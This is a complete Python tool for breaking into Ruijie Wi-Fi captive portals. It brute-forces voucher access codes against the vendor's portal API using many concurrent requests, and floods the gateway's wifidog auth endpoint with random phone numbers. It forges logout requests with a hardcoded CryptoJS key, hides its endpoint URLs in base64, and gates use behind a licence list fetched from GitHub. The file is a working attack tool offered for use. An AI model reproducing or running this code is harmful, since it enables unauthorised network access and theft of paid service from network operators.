import os
import re
import sys
import zlib
import json
import time
import ping3
import ntplib
import base64
import random
import string
import urllib
import marshal
import aiohttp
import asyncio
import hashlib
import argparse
import requests
import subprocess
from datetime import timedelta
from urllib.parse import quote
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.Random import get_random_bytes
from concurrent.futures import ThreadPoolExecutor

__ALL__ = []
SUCCESS = 0
IN_RUNNING_ASCII_BIN = []
MY = ""
try:
    ascii_lower_bin6 = open("ascii_lower_bin6.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_lower_bin6 = []
try:
    ascii_lower_bin7 = open("ascii_lower_bin7.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_lower_bin7 = []
try:
    ascii_upper_bin6 = open("ascii_upper_bin6.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_upper_bin6 = []
try:
    ascii_upper_bin7 = open("ascii_upper_bin7.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_upper_bin7 = []
try:
    ascii_bin_mix6 = open("ascii_bin_mix6.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_bin_mix6 = []
try:
    ascii_bin_mix7 = open("ascii_bin_mix7.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_bin_mix7 = []

def clear():
    os.system("clear")

w = "\033[1;00m"
g = "\033[1;32m"
y = "\033[1;33m"
r = "\033[1;31m"
b = "\033[1;34m"

def Line():
    print(f"{y}-\033[1;00m"*os.get_terminal_size()[0])

def Logo():
    clear()
    logo = f"""{r}                Enter You Logo{w}
    
    """
    print(logo)
    Line()
    print(f"{w}[*] This tool is created by ")
    print(f"{w}[*] Creator telegram account ")
    print(f"{w}[*] This tool is only for Ruijie Network Router")
    Line()
#feature
def feature():
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", help="features option", choices=["code", "internet", "check", "setup"], required=True)
    parser.add_argument("-m", "--mode", help="type of voucher code", choices=["digit", "ascii-lower", "ascii-upper", "ascii-mix"], default="digit")
    parser.add_argument("-l", "--length", help="length of voucher code(default 6)", choices=[6,7], type=int, default=6)
    parser.add_argument("-s", "--speed", help="voucher code bruteforce speed", type=int, default=100)
    parser.add_argument("-t", "--tasks", help="number of tasks for parallel works", type=int, default=100)
    parser.add_argument("-d", "--debug", help="to show debug message", action="store_true")
    args = parser.parse_args() 
    option = args.option
    mode = args.mode
    length = args.length
    speed = args.speed
    tasks = args.tasks
    debug = args.debug
    if option == "code":
        status = asyncio.run(Security().check())
        if status:
            vobj = VoucherCode(mode=mode, length=length, speed=speed, tasks=tasks, debug=debug)
            if mode == "digit":
                asyncio.run(vobj.execute_digit())
            elif mode == "ascii-lower" or mode == "ascii-upper" or mode == "ascii-mix":
                asyncio.run(vobj.execute_ascii())
        else:
            print(f"{r}[!] Internal Error: code -10")
            sys.exit(0)
    elif option == "internet":
        status = asyncio.run(Security().check())
        if status:
            iobj = InternetAccess()
            asyncio.run(iobj.execute())
        else:
            print(f"{r}[!] Internal Error: code -11")
            sys.exit(0)
    elif option == "check":
        status = asyncio.run(Security().check())
        if status:
            robj = RecheckVoucher()
            asyncio.run(robj.check())
        else:
            print(f"{r}[!] Internal Error: code -12")
            sys.exit(0)
    elif option == "setup":
        Setup().set()
    
async def get_session_id(session, session_url, previous_session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        async with session.get(session_url, headers=headers) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response).group(1)
            return session_id
    except Exception as e:
        return previous_session_id

class InternetAccess:
    def __init__(self):
        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
        
        try:
            self.ip = open(".ip", "r").read().strip()
        except FileNotFoundError:
            print(f"{r}[!] Ip not found try again after setup")
            sys.exit()

    def get_random_code(self):
        random_code = "".join(random.choice(string.digits) for _ in range(6))
        return random_code

    async def send_request(self, session, session_id, log=True):
        random_code = self.get_random_code()
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        params = {
            'token': session_id,
            'phoneNumber': random_code,
        }
        try:
            async with session.post(f'http://{self.ip}:2060/wifidog/auth?', params=params, headers=headers) as response:
                if log:
                    status_code = f"{g}{response.status}"
                    now = f"{b}{time.strftime("%H-%M-%S")}"
                    ping_status = await asyncio.to_thread(ping3.ping, 'google.com')
                    ping = self.get_ping(ping_status)
                    is_open = await self.is_internet_access(session)
                    print(f"{w}time: {now}, {w}status: {status_code}, {w}ping: {ping}, {w}internet-open: {is_open}")
        except:
            return
    
    async def is_internet_access(self, session):
        try:
            async with session.get("https://httpbin.org/") as req:
             return "\033[1;32mTrue\033[1;00m"
        except:
            return "\033[1;31mFalse\033[1;00m"
    
    def get_ping(self, ping):
        if ping is None:
            return '\033[1;31mUnknown\033[1;00m'
        else:
            ping = int(ping * 1000)
            if ping >= 100:
                return '\033[1;31m'+str(ping)+'\033[0;00m'
            elif ping >= 90 and ping < 100:
                return '\033[1;33m'+str(ping)+'\033[0;00m'
            if ping < 90:
                return '\033[1;32m'+str(ping)+'\033[0;00m'
    
    async def execute(self):
        Logo()
        print(f"{g}[+] If there are no logs for a long time, turn your Wi-Fi off and on")
        Line()
        connector = aiohttp.TCPConnector(limit=10)
        timeout = aiohttp.ClientTimeout(total=10)
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                loop = 0
                tasks = []
                continue_running = True
                while continue_running:
                    if loop % 5 == 0:
                        session_id = await get_session_id(session, self.session_url, None)
                    tasks.append(self.send_request(session, session_id, log=True))
                    if len(tasks) >= 5:
                        await asyncio.gather(*tasks)
                        tasks = []
                    loop += 1
                    await asyncio.sleep(1)
        except KeyboardInterrupt:
            print(f"{y}[*] User cancel called")
            sys.exit()

async def login_voucher(session, session_id, voucher, file=None, check=False, debug=False):
    global SUCCESS
    data = {
        "accessCode": voucher,
        "sessionId": session_id,
        "apiVersion": 1
    }
    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://portal-as.ruijienetworks.com",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": f'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        async with session.post(post_url, json=data, headers=headers) as req:
            response = await req.text()
    except Exception as Error:
        return
    if 'logonUrl' in response:
        SUCCESS += 1
        print(f'\033[1;32mSuccess: {voucher}')
        write_file(file="success.txt", data=voucher)
    elif 'expired' in response:
        if not check:
            print(f'\033[1;33mExpired: {voucher}')
        write_file(file, voucher)
    elif 'failed' in response:
        if debug:
            print(f'\033[1;31mFailed: {voucher}')
        write_file(file, voucher)
    elif 'STA' in response:
        if not check:
            print(f'\033[1;34mLimited: {voucher}')
        write_file(file, voucher)

def write_file(file, data):
    with open(file, "a") as f:
        f.write(data+"\n")

def ascii_generator(mode, length):
    if mode == "ascii-lower":
        voucher = "".join(random.choice(string.ascii_lowercase) for _ in range(length))
        if length == 6:
            if not voucher in ascii_lower_bin6 and not voucher in IN_RUNNING_ASCII_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
        elif length == 7:
            if not voucher in ascii_lower_bin7 and not voucher in IN_RUNNING_ASCII_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
    elif mode == "ascii-upper":
        voucher = "".join(random.choice(string.ascii_uppercase) for _ in range(length))
        if length == 6:
            if not voucher in ascii_upper_bin6 and not voucher in IN_RUNNING_ASCII_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
        elif length == 7:
            if not voucher in ascii_upper_bin7 and not voucher in IN_RUNNING_ASCII_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
    elif mode == "ascii-mix":
        voucher = "".join(random.choice(string.ascii_uppercase+string.ascii_lowercase) for _ in range(length))
        if length == 6:
            if not voucher in ascii_bin_mix6 and not voucher in IN_RUNNING_ASCII_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
        elif length == 7:
            if not voucher in ascii_bin_mix7 and not voucher in IN_RUNNING_ASCII_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)

def digit_generator(length):
    vouchers = []
    range_ = 1000000 if length == 6 else 10000000
    for i in range(0, range_):
        vouchers.append(str(i).zfill(length))
    return vouchers

class VoucherCode:
    def __init__(self, mode=None, length=None, speed=None, tasks=None, debug=True):
        self.mode = mode
        self.length = length
        self.speed = speed
        self.tasks = tasks
        self.debug = debug
        if self.mode == "digit":
            if self.length == 6:
                self.file = "failed.txt"
            elif self.length == 7:
                self.file = "failed7.txt"
        elif self.mode == "ascii-lower":
            if self.length == 6:
                self.file = "ascii_lower_bin6.txt"
            elif self.length == 7:
                self.file = "ascii_lower_bin7.txt"
        elif self.mode == "ascii-upper":
            if self.length == 6:
                self.file = "ascii_upper_bin6.txt"
            elif self.length == 7:
                self.file = "ascii_upper_bin7.txt"
        elif self.mode == "ascii-mix":
            if self.length == 6:
                self.file = "ascii_bin_mix6.txt"
            elif self.length == 7:
                self.file = "ascii_bin_mix7.txt"
        try:
            self.session_url = open(".session_url", "r").read().strip()
        except FileNotFoundError:
            print(f"{r}[!] Session url not found try again after setup")
            sys.exit()
    
    def remove_already_checked(self, vouchers):
        try:
            self.fail_code = set(open(self.file, "r").read().splitlines())
        except FileNotFoundError:
            self.fail_code = set()
        try:
            success_code = set(open("success.txt", "r").read().splitlines())
        except FileNotFoundError:
            success_code = set()
        self.removed = list(set(vouchers) - set(self.fail_code) - set(success_code))
        return list(self.removed), list(success_code), list(self.fail_code)

    async def execute_ascii(self):
        global IN_RUNNING_ASCII_BIN
        connector = aiohttp.TCPConnector(limit=self.speed)
        timeout = aiohttp.ClientTimeout(total=20)
        if self.mode == "ascii-lower" and self.length == 6:
            checked = str(len(ascii_lower_bin6))
        elif self.mode == "ascii-lower" and self.length == 7:
            checked = str(len(ascii_lower_bin7))
        elif self.mode == "ascii-upper" and self.length == 6:
            checked = str(len(ascii_upper_bin6))
        elif self.mode == "ascii-upper" and self.length == 7:
            checked = str(len(ascii_upper_bin7))
        elif self.mode == "ascii-mix" and self.length == 6:
            checked = str(len(ascii_bin_mix6))
        elif self.mode == "ascii-mix" and self.length == 7:
            checked = str(len(ascii_bin_mix7))
        Logo()
        print(f"[*] Generated voucher codes (unlimited)")
        print(f"[*] Already checked codes ({checked})")
        print(f"[*] success vouchers and failed vouchers are saved in local")
        Line()
        print(f"[*] Bruteforce mode {self.mode}")
        print(f"[*] Voucher code length {str(self.length)}")
        print(f"[*] Bruteforce speed {str(self.speed)}")
        print(f"[*] Bruteforce tasks {str(self.tasks)}")
        print(f"[*] Show debug message {str(self.debug)}")
        Line()
        print(f"{g}[+] Voucher code brutefore process is running...")
        Line()
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                tasks = []
                loop = 0
                while True:
                    voucher = ascii_generator(self.mode, self.length)
                    if loop % 90 == 0:
                        session_id = await get_session_id(session, self.session_url, None)
                    tasks.append(login_voucher(session, session_id, voucher, file=self.file, debug=self.debug))
                    if len(tasks) >= self.tasks:
                        await asyncio.gather(*tasks)
                        tasks = []
                    loop += 1
                    IN_RUNNING_ASCII_BIN.append(voucher)
                if tasks:
                    await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            print(f"{y}[*] User cancel called")
            sys.exit(0)
        Line()
        print(f"{g}[*] Process is finished")
        sys.exit(0)

    async def execute_digit(self):
        generated_code = digit_generator(length=self.length)
        vouchers_code, success_code, fail_code = self.remove_already_checked(generated_code)
        connector = aiohttp.TCPConnector(limit=self.speed)
        timeout = aiohttp.ClientTimeout(total=20)
        Logo()
        print(f"[*] Generated voucher codes ({len(generated_code)})")
        print(f"[*] Already checked codes ({len(generated_code)-len(vouchers_code)})")
        print(f"[*] Still remain to check codes ({len(vouchers_code)})")
        print(f"[*] success vouchers and failed vouchers are saved in local")
        Line()
        print(f"[*] Bruteforce mode {self.mode}")
        print(f"[*] Voucher code length {str(self.length)}")
        print(f"[*] Bruteforce speed {str(self.speed)}")
        print(f"[*] Bruteforce tasks {str(self.tasks)}")
        print(f"[*] Show debug message {str(self.debug)}")
        Line()
        print(f"{g}[+] Voucher code brutefore process is running...")
        Line()
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                tasks = []
                for loop, voucher in enumerate(vouchers_code, start=0):
                    if loop % 90 == 0:
                        session_id = await get_session_id(session, self.session_url, None)
                    tasks.append(login_voucher(session, session_id, voucher, file=self.file, debug=self.debug))
                    if len(tasks) >= self.tasks:
                        await asyncio.gather(*tasks)
                        tasks = []
                if tasks:
                    await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            print(f"{y}[*] User cancel called")
            sys.exit(0)
        Line()
        print(f"{g}[*] Process is finished")
        sys.exit(0)

class RecheckVoucher:
    def __init__(self):
        self.file = "failed.txt" or "failed7.txt"
        try:
            self.success_code = open("success.txt", "r").read().splitlines()
        except Exception as err:
            print(f"{r}[!] Exit, you didn't have any success code")
            sys.exit(0)
        if len(self.success_code) == 0:
            print(f"{r}[!] Exit, you didn't have any success code")
            sys.exit(0)
        try:
            self.session_url = open(".session_url", "r").read().strip()
        except FileNotFoundError:
            print(f"{r}[!] Sesion url not found try again after setup")
            sys.exit()
    
    async def check(self):
        Logo()
        print(f"{y}[*] Don't stop this program while running")
        Line()
        print(f"{g}[+] The success code recheck program is starting...")
        Line()
        os.remove("success.txt")
        connector = aiohttp.TCPConnector(limit=30)
        timeout = aiohttp.ClientTimeout(total=20)
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                tasks = []
                for loop, voucher in enumerate(self.success_code, start=0):
                    if loop % 90 == 0:
                        session_id = await get_session_id(session, self.session_url, None)
                    tasks.append(login_voucher(session, session_id, voucher, file=self.file, check=True))
                    if len(tasks) >= 5:
                        await asyncio.gather(*tasks)
                        tasks = []
                if tasks:
                    await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            print(f"{y}[*] User cancel called")
            sys.exit(0)
        Line()
        print(f"{g}[*] Recheck success voucher code process is finished")

class Setup:
    def __init__(self):
        Logo()
        self.baseurl = "http://10.44.77.240:2060"
        self.username_get_url = self.baseurl + "/username_get"
        self.online_info_url = self.baseurl + "/user/online_info"
        self.logout_url = self.baseurl + "/user/logout"
    
    def set(self):
        print(f"{g}[+] Setting up the wifi info...")
        status = self.unbind()
        Line()
        if not status:
            print(f"{y}[!] Unbinding the wifi failed")
            Line()
        else:
            print(f"{g}[+] Unbinding wifi success")
            time.sleep(6)
            Line()
        print(f"{g}[+] Trying to get info")
        
        try:
            localhost = requests.get("http://192.168.0.1",timeout=10).url
            ip = re.search('gw_address=(.*?)&', localhost).group(1)
            headers = {
                'authority': 'portal-as.ruijienetworks.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'referer': localhost,
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            }
            req = requests.get(localhost, headers=headers).text
            session_url = "https://portal-as.ruijienetworks.com" + re.search("href='(.*?)'</script>", req).group(1)
            open(".session_url", "w").write(session_url)
            open(".ip", "w").write(ip)
            Line()
            print(f"{g}[+] Setup success")
        except Exception as err:
            Line()
            print(f"{r}[!] Setup failed, Error info: {err.__class__.__name__}")
            sys.exit(0)

    def unbind(self):
        username = self.username_get()
        if not username:
            return False
        online_info = self.get_online_info(username)
        if not online_info:
            return False
        data = self.arrange_data(online_info)
        return self.logout(data, username)

    def username_get(self):
        try:
            req = requests.get(self.username_get_url).json()
        except:
            return None
        username = req.get("username", None)
        return username
    
    def get_online_info(self, username):
        params = {
            "username":username,
            "usertype":"wifidog"
        }
        try:
            req = requests.get(self.online_info_url, params=params).json()
        except:
            return None
        try:
            req["data"]["list"][0]
        except IndexError:
            return None
        return req["data"]["list"][0]

    def arrange_data(self, info):
        repmac = info["mac"].replace(":", "")
        repmac = [repmac[i:i+4] for i in range(0, len(repmac), 4)]
        mac_req = ".".join(repmac)
        return {
            "ip":info["ip"],
            "mac":info["mac"],
            "ip_req":info["ip"],
            "mac_req":mac_req
        }

    def get_data(self):
        try:
            req = requests.get(self.baseurl).text
            return req
        except:
            return None

    def extract_chap(self, data):
        match = re.search(r"chap_id=([^&]+)&chap_challenge=([^']+)", data)
        if not match:
            return None
        return {
            "chap_id":match.group(1),
            "chap_challenge":match.group(2)
        }
    
    def encrypt_cryptojs(self, auth, enc_key):
        salt = get_random_bytes(8)
        key_iv = b''
        prev = b''
        while len(key_iv) < 48:
            prev = hashlib.md5(prev + enc_key.encode("utf-8") + salt).digest()
            key_iv += prev
        key = key_iv[:32]
        iv = key_iv[32:48]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        padded_data = pad(auth.encode("utf-8"), AES.block_size)
        cipher_text = cipher.encrypt(padded_data)
        encrypted_data = b"Salted__" + salt + cipher_text
        return base64.b64encode(encrypted_data).decode("utf-8")

    def get_auth(self, username):
        enc_key = "RjYkhwzx$2018!"
        data = self.get_data()
        if not data:
            print(f"{r}[!] Failed to get data, make sure you are connected to the Wi-Fi and try again")
            sys.exit(0)
        chaps = self.extract_chap(data)
        if not chaps:
            print(f"{r}[!] Failed to extract chap_id and chap_challenge, make sure you are connected to the Wi-Fi and try again")
            sys.exit(0)
        chap_id_decoded = urllib.parse.unquote(chaps["chap_id"])
        chap_challenge_decoded = urllib.parse.unquote(chaps["chap_challenge"])
        auth = chap_id_decoded + chap_challenge_decoded + username
        auth_encrypt = self.encrypt_cryptojs(auth, enc_key)
        return auth_encrypt

    def logout(self, data, username):
        auth = self.get_auth(username)
        payload = f"ip={data['ip']}&mac={data['mac']}&ip_req={data['ip_req']}&mac_req={data['mac_req']}&auth={auth}"
        try:
            respond = requests.post(self.logout_url, data=payload).json()
            if respond["success"]:
                return True
        except Exception as err:
            return False

def get_current_time():
    try:
        client = ntplib.NTPClient()
        respond = client.request('pool.ntp.org', version=3)
        return time.ctime(respond.tx_time)
    except:
        return None
            
def get_random_string(length):
    return ''.join(random.choice(string.digits) for _ in range(length))

#clentlist
async def get_client_list(session):
    github = "https://raw.githubusercontent.com/ytun9959-design/Approval/main/auth.json"
    try:
        async with session.get(github) as req:
            response = await req.text()
    except Exception as err:
        response = None
    finally:
        return response

#checkkeyexpiration
def check_key_expiration(expiration_time, current_time):
    from datetime import datetime
    try:
        mm, hh, dd, MM, yyyy = map(int, expiration_time.split('-'))
        expiration_dt = datetime(year=yyyy, month=MM, day=dd, hour=hh, minute=mm, second=0)
    except Exception as e:
        print("Invalid expiration time format, treating as expired.")
        return None
    try:
        current_dt = datetime.strptime(current_time, "%a %b %d %H:%M:%S %Y")
    except Exception as e:
        print("Invalid current time format, using current system time instead.")
        return None
    if expiration_dt > current_dt:
        return True
    else:
        return False

def get_uid():
    uid = str(os.getlogin())+str(os.getuid())
    return uid

class Security:
    def __init__(self):
        Logo()
        self.client_list = None
        self.client_key = get_uid()
        self.current_time = None
    
    async def check(self):
        await self.request_server()
        if not self.client_list or not self.current_time:
            print(f"{r}[!] Failed to check key")
            sys.exit(0)
            os._exit(0)
        return self.check_key()

    def check_key(self):
        clients = json.loads(self.client_list)["clients"]
        for client in clients:
            uid, exp = client.split("@")
            if uid == self.client_key:
                status = check_key_expiration(exp, self.current_time)
                if not status:
                    print(f"{y}[!] Your key is expired")
                    sys.exit(0)
                    os._exit(0)
                return True
                break
        print(f"{r}[!] Your key is not registered")
        Line()
        print(f"{g}[+] Your key: {get_random_string(2)+base64.b16encode(self.client_key.encode()).decode()+get_random_string(3)}")
        sys.exit(0)
        os._exit(0)


    async def request_server(self):
        iobj = InternetAccess()
        timeout = aiohttp.ClientTimeout(total=20)
        try:
            async with aiohttp.ClientSession(timeout=timeout) as session:
                loop = 0
                for i in range(10):
                    if loop % 5 == 0:
                        session_id = await get_session_id(session, iobj.session_url, None)
                    await iobj.send_request(session, session_id, log=False)
                    self.client_list = await get_client_list(session)
                    self.current_time = get_current_time()
                    if self.client_list and self.current_time:
                        break
                    loop += 1
        except:
            return

feature()